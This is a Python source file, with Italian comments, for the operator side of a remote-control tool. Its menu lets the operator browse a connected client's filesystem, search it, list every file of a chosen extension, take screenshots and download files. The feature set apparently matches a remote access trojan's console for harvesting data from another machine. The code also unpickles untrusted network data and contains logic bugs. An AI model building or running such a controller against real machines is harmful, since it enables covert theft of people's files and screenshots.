import os
import pickle
from socket import *
import platform
import psutil
import time
import signal
from os import name, system
import traceback
import sys

IP="localhost"
PORT = 12806 #Porta di 2Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
FORMATWIN="windows-1252"
FORMATPDF="latin-1"


#OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system()=="Windows":
        system("cls")
    else:
        system("clear")


#OK gestisce il ctrl-C per l'uscita
def signalHandler(signum,frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end = "", flush=True)
    exit(1)


#OK crea connessione
def serverConnection():
    try:
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(ADDR)
        server.listen(5)
        print(f"\n[LISTENING] Server is up and it's waiting for a client connection")
        time.sleep(5)
        return server
    except:
        traceback.print_exc()
        print(f"[ERROR] Connection refused")
        return "errore"


#OK lista dei comandi disponibili per il controllo remoto
def commandsHelp():
    print("#####    Comandi disponibili     ####")
    print()
    print("Download di file:    download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
    print("Mostra Working Directory:    pwd")
    print("Lista dei file in un percorso:   ls")
    print("Cambia posizione:    cd <path>")
    print("Cerca un file in tutto il FileSystem:   find <nomeFile.estensione>")
    print("Cerca un file nel path desiderato:   find <nomeFile.estensione> <Path>")
    print("Effettua screenshot:     screenshot")
    print("Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <nomeFiletxt> <estensione>")
    print("aggiungere di poter usare anche gli altri comandi")
    print("file log")
    print("Esci dal controllo remoto:   exit")
    print()
    print("####################################")


#OK STAMPA INFO CLIENT
def printInformazioni(clientConnection):

    #Ricezione del file dal Client
    buff=1
    risposta="y"
    nbytes=1

    try:
        while buff and nbytes != '':
            nbytes = clientConnection.recv(256).decode(FORMAT)
            newNBytes=""
            buff=""

            if nbytes[0:1].isdigit():
                while nbytes[0:1].isdigit():
                    newNBytes=newNBytes+nbytes[0:1]
                    nbytes=nbytes[1:]
                buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
            else:
                time.sleep(3)
                buff=clientConnection.recv((int(nbytes))).decode(FORMAT)

            nbytes=''
            if buff[0:7] == "[ERROR]":
                risposta=input(buff)
                clientConnection.send((risposta).encode(FORMAT))
                if risposta == "Y" or risposta == "y":
                    buff = 1
                    nbytes= 1
                elif risposta == "N" or risposta == "n":
                    buff = 0
                    break

            print(buff)

        if risposta == "Y" or risposta == "y":
            print(f"[RECEIVING]\n")
        elif risposta == "N" or risposta == "n":
            print(f"[NOT RECEIVING]\n")
    except:
        traceback.print_exc()
        raise Exception


def filespath(clientConnection):

    try:
        nomeFile = input("Che nome vuoi dare al file?: ")
        file = open(nomeFile, 'wb')
        filesize = clientConnection.recv(1024).decode(FORMAT)
        if filesize == "Download fallito":
            print(filesize)
            raise Exception
        time.sleep(3)
        #barra di caricamento
        file.write(clientConnection.recv(int(filesize)))
        file.close()
        print("File con percorsi dei file creato!")
    except:
        print("Download fallito\n")
def remoteControl(clientConnection):
    while True:
        #commandsHelp()
        path = clientConnection.recv(1024).decode(FORMAT)
        comando=input(path+"$ ")
        while comando=="":
            comando=input(path+"$ ")

        clientConnection.send((comando).encode(FORMAT))
        if comando == "exit":
            print("Procedura di controllo remoto conclusa con successo!")
            clientConnection.send((comando).encode(FORMAT))
            break
        elif comando[0:2] == "ls":
            listdir=pickle.loads(clientConnection.recv(1024))
            for item in listdir:
                print("-: "+item)
        elif comando[0:8] == "download":
            try:
                # Write File in binary
                file = open(comando[10:len(comando)-1], 'wb')
                # Keep receiving data from the server
                filesize = clientConnection.recv(1024).decode(FORMAT)
                if filesize=="Download fallito":
                    print(filesize)
                    raise Exception
                time.sleep(3)
                file.write(clientConnection.recv(int(filesize)))
                file.close()
            except:
                print("Download fallito\n")

        elif comando == "pwd":
            pwdresult=clientConnection.recv(1024).decode(FORMAT)
            print(pwdresult)
        #"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
        elif comando[0:9] == "filespath":
            filespath(clientConnection)
            time.sleep(3)
        elif comando[0:4] == "find":
            listresult=pickle.loads(clientConnection.recv(1024))
            for item in listresult:
                print("-: "+item)
        elif comando == "clear":
            clearScreen()



def main():

    signal.signal(signal.SIGINT, signalHandler)
    server = serverConnection()

    if server == "errore":
        raise Exception
    else:
        exit = False
        while exit == False:

            clientConnection, addr = server.accept()
            print(f"[CONNECTED] Client {addr} is connected to the server")

            print(f"INFORMAZIONI SISTEMA OPERATIVO CLIENT:\n")
            t_end = time.time() + 5
            while time.time() < t_end:
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)

            # ricevo info sul sistema
            try:
                printInformazioni(clientConnection)
                time.sleep(2)
            except:
                print("Qualcosa nella print informazioni non ha funzionato...attendi\n")
                t_end = time.time() + 5
                while time.time() < t_end:
                    print(".", end="")
                    time.sleep(1)
                    print(".", end="")
                    time.sleep(1)
                    print(".")
                    time.sleep(1)

            #procedura remote control
            attivo=1
            while attivo==1:
                try:
                    print("[REMOTE CONTROL] Starting procedure...")
                    t_end = time.time() + 5
                    while time.time() < t_end:
                        print(".", end="")
                        time.sleep(1)
                        print(".", end="")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                    remoteControl(clientConnection)
                    time.sleep(2)
                    attivo=0
                except:
                    traceback.print_exc()
                    risposta=input("Remote control non disponibile, riprovare? Y/N ")
                    print(risposta)
                    if risposta=="Y" or "y":
                        attivo=1
                    elif risposta=="N" or "n":
                        attivo=0


            clientConnection.close()
            print(f"[CLOSED] Client Connection closed succesfully!")
            print()

            # Le operazioni sono concluse e decido come procedere
            print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
            print(f"[DECISION] 1 - Keep Listening")
            print(f"[DECISION] 2 - Close Server")
            restartDecision = input("> ")

            if restartDecision == '2':
                exit = True
                print(f"[INFO] The Server was shut down successfully")
                server.close()
                sys.exit(0)
            elif restartDecision == '1':
                print(f"[INFO] The server keeps listening...")
                t_end = time.time() + 10
                while time.time() < t_end:
                    print(".", end="")
                    time.sleep(1)
                    print(".", end="")
                    time.sleep(1)
                    print(".")
                    time.sleep(1)
            else:
                clientConnection.close()
                server.close()


if __name__ == "__main__":
    #, gestione comandi nativi rc,
    #file log, screenshot, agg commnaHelps, cd del path completo
    ##download cartelle, loop clientcclose, barra di caricamento
    #controllare dove fare differenze di sistema

    #while True:
        try:
            main()
        except:
            #traceback.print_exc()2
            #print("Mi sto riconnetendo")
            t_end = time.time() + 10
            while time.time() < t_end:
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)
